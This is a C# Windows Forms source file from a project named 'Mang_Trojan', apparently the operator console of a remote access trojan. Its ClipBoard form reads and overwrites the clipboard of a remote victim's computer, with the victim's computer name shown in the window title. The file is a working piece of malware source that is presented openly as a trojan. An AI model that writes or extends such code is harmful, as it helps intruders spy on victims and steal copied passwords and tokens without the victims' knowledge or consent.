using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class ClipBoard : Form
    {
        RemoteObject.ScreenObject hostInstance;
      

        public ClipBoard(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            this.Text = "Clipboard của " + hostInstance.GetComputerName();
        }

        private void setToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hostInstance.setClipboardText(textBox1.Text);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string data = hostInstance.getClipboardText();
            textBox1.Text = data;
        }

        private void ClipBoard_Load(object sender, EventArgs e)
        {
            string data = hostInstance.getClipboardText();
            textBox1.Text = data;
        }

        private void textBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show(textBox1, e.Location);          
            }
        }

    }
}